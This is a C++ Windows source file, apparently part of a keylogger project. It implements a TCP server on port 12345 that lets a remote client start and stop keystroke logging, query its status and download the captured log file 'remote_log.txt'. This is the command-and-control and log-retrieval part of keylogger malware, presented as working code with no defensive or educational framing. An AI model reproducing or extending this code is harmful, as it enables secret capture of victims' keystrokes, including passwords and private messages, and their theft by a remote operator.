#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <thread>
#include <atomic>
#include <fstream>
#include <sstream>
#include "../include/server.h" // Inclusion du fichier d'en-tête
#include "../include/keylogger_utils.h"

#pragma comment(lib, "Ws2_32.lib")

extern std::atomic<bool> isLogging;
extern std::wofstream outFile;

void startLogging();
void stopLogging();

void handle_client(SOCKET client_socket) {
    char buffer[512];
    int result;

    while ((result = recv(client_socket, buffer, sizeof(buffer), 0)) > 0) {
        std::string command(buffer, result);
        std::cout << "Received command: " << command << std::endl;

        if (command == "start") {
            startLogging();
            send(client_socket, "Logging started\n", 16, 0);
        } else if (command == "stop") {
            stopLogging();
            send(client_socket, "Logging stopped\n", 15, 0);
        } else if (command == "status") {
            std::string status = isLogging ? "Logging is on\n" : "Logging is off\n";
            send(client_socket, status.c_str(), status.length(), 0);
        } else if (command == "getlog") {
            if (outFile.is_open()) {
                outFile.close();
            }
            std::ifstream logFile("remote_log.txt");
            std::stringstream logContent;
            logContent << logFile.rdbuf();
            send(client_socket, logContent.str().c_str(), logContent.str().length(), 0);
        } else {
            send(client_socket, "Unknown command\n", 16, 0);
        }
    }

    closesocket(client_socket);
}

void startServer() {
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        std::cerr << "WSAStartup failed: " << result << std::endl;
        return;
    }

    SOCKET server_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (server_socket == INVALID_SOCKET) {
        std::cerr << "Error at socket(): " << WSAGetLastError() << std::endl;
        WSACleanup();
        return;
    }

    sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(12345);

    result = bind(server_socket, (sockaddr*)&server_addr, sizeof(server_addr));
    if (result == SOCKET_ERROR) {
        std::cerr << "bind failed: " << WSAGetLastError() << std::endl;
        closesocket(server_socket);
        WSACleanup();
        return;
    }

    result = listen(server_socket, SOMAXCONN);
    if (result == SOCKET_ERROR) {
        std::cerr << "listen failed: " << WSAGetLastError() << std::endl;
        closesocket(server_socket);
        WSACleanup();
        return;
    }

    std::cout << "Server is listening on port 12345" << std::endl;

    while (true) {
        SOCKET client_socket = accept(server_socket, NULL, NULL);
        if (client_socket == INVALID_SOCKET) {
            std::cerr << "accept failed: " << WSAGetLastError() << std::endl;
            closesocket(server_socket);
            WSACleanup();
            return;
        }

        std::thread(handle_client, client_socket).detach();
    }

    closesocket(server_socket);
    WSACleanup();
}
